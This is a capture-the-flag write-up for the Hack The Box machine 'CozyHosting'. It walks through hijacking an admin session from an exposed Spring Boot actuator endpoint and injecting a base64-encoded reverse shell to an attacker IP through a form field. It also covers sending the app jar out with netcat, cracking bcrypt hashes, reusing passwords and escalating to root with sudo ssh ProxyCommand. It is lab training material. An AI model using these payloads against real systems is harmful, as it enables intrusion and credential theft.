---
title: "CozyHosting - Writeup"
linkTitle: "CozyHosting"
weight: 16
featured: true
platform: "HTB"
name: "CozyHosting"
os: "Linux"
difficulty: "Medium"
release: "26 Aug 2023"
ip: "10.129.39.173"
# Drop a real avatar at static/img/htb/cozyhosting.png and uncomment:
# avatar: "/img/htb/cozyhosting.png"
tags: ["linux", "spring-boot", "actuator-endpoints", "jsessionid-leak", "session-hijacking", "command-injection", "postgresql", "bcrypt", "hashcat", "password-reuse", "gtfobins-ssh", "sudo-abuse"]
description: "Medium Linux box. A leaked JSESSIONID from an exposed Spring Boot actuator endpoint hijacks an admin session, a command injection in the host-patching form gives a shell, and a reused cracked password plus a GTFOBins sudo/ssh escape lead to root."
---
{{< htb name="CozyHosting" os="Linux" difficulty="Medium" release="26 Aug 2023" ip="10.129.39.173" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.39.173
```
```
Open 10.129.39.173:22
Open 10.129.39.173:80
```

![cozyhosting.htb homepage — a generic hosting/business landing page](/img/htb/cozyhosting/01-cozyhosting-homepage.png)

## Enumeration

The login page sets a `JSESSIONID` cookie — a strong signal this is a Java-based framework, most likely Spring Boot.

![Burp request/response for /login showing the JSESSIONID cookie and a Referer pointing at /admin](/img/htb/cozyhosting/02-jsessionid-cookie.png)

Fuzzed for exposed Spring Boot Actuator endpoints, which are a common source of accidental information disclosure:

```
(root㉿kali)# ffuf -u "http://cozyhosting.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -c
```
```
actuator                [Status: 200]
actuator/env            [Status: 200]
actuator/health         [Status: 200]
actuator/mappings       [Status: 200]
actuator/sessions       [Status: 200]
actuator/beans          [Status: 200]
```

`/actuator/sessions` is the interesting one — it maps live session IDs directly to usernames, with no authentication required to view it:

![/actuator/sessions leaking a live session ID tied to the username "kanderson"](/img/htb/cozyhosting/03-actuator-sessions-leak.png)

Dropping that leaked `JSESSIONID` into the browser and navigating to `/admin` hijacks the session outright — no password needed.

![Browser navigating to /admin using the hijacked kanderson session cookie](/img/htb/cozyhosting/04-session-hijack-admin.png)

Full admin access to the "Cozy Cloud" dashboard as **kanderson**, no credentials required.

![Cozy Cloud admin dashboard reached via the hijacked session, showing an "Include host into automatic patching" form](/img/htb/cozyhosting/05-admin-dashboard.png)

## Initial Foothold

The "Include host into automatic patching" form takes a **Hostname** and **Username**, then presumably shells out to `ssh` to reach that host — a classic command injection surface. Found a ready-made exploit for exactly this:

```
https://github.com/BigyanKalakheti/CozyExploit
```

```
(root㉿kali)# python cozy_exploit.py
```
```
JSESSIONID for 'kanderson': ['B19E9B80EDEF6EC775F0B4FED4F2CCB0']
Enter your IP address: 10.10.15.249
Enter port number: 1234
Using Payload: ";echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDkvMTIzNCAwPiYxCg=="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;"
```

The script builds a base64-encoded reverse shell one-liner and smuggles it into the Username field of the patching form:

![The generated command-injection payload filled into the Username field, ready to submit](/img/htb/cozyhosting/06-command-injection-payload.png)

```
(root㉿kali)# nc -lnvp 1234
```
```
listening on [any] 1234 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.39.173] 42612
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

## Privilege Escalation

The application jar itself holds the database credentials. Pulled it over to the attack box for a closer look:

```
app@cozyhosting:/app$ nc 10.10.15.249 4444 < cloudhosting-0.0.1.jar
```
```
(root㉿kali)# nc -lnvp 4444 > a.jar
(root㉿kali)# unzip a.jar
(root㉿kali)# cat BOOT-INF/classes/application.properties
```
```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR#
```

```
app@cozyhosting:/app$ psql -U postgres -h localhost
```
```
Password: Vg&nvzAQ7XxR
```

```
cozyhosting=# select * from users;
```
```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Both hashes are bcrypt. The admin hash cracks quickly against rockyou:

```
(root㉿kali)# hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
```
```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
Status...........: Cracked
```

The only local home directory belongs to `josh`, not `kanderson` or `admin` — and the cracked admin database password turns out to be **reused as josh's system password**:

```
app@cozyhosting:~$ su josh
```
```
Password: manchesterunited
```

```
josh@cozyhosting:~$ cat /home/josh/user.txt
```
```
d677bb4ff02f791e21970f042314ec1e
```

`sudo -l` shows josh can run `ssh` as root with any arguments — a textbook [GTFOBins](https://gtfobins.org/gtfobins/ssh/) escalation:

```
josh@cozyhosting:~$ sudo -l
```
```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
```
# cat /root/root.txt
ab77705a822cbf1ff8d249b0b15fb47b
```

Abusing `ssh`'s `ProxyCommand` option makes it spawn an arbitrary shell before ever attempting a connection — since `sudo` grants root on the whole `ssh *` invocation, that shell comes back as root.

## Lessons learned

- A `JSESSIONID` cookie is a giveaway for Java/Spring apps — always check for exposed Actuator endpoints (`/actuator`, `/actuator/env`, `/actuator/sessions`, `/actuator/beans`) since they're a frequent and severe misconfiguration.
- `/actuator/sessions` specifically is a session-hijacking goldmine: it maps live session tokens to usernames with zero authentication, letting you skip password guessing entirely.
- Any form field that ends up feeding into a shelled-out command (like an SSH connection helper) is a command injection candidate — look for base64/`$IFS`-style tricks to smuggle payloads past naive input filtering.
- Cracked passwords are worth trying everywhere, not just where they were found — the admin's database password turned out to be reused as a completely different local user's login password.
- Always run `sudo -l` before looking for anything more complex — a single wildcard-argument `ssh` entry was the entire path to root here via a well-known [GTFOBins](https://gtfobins.org/) technique.
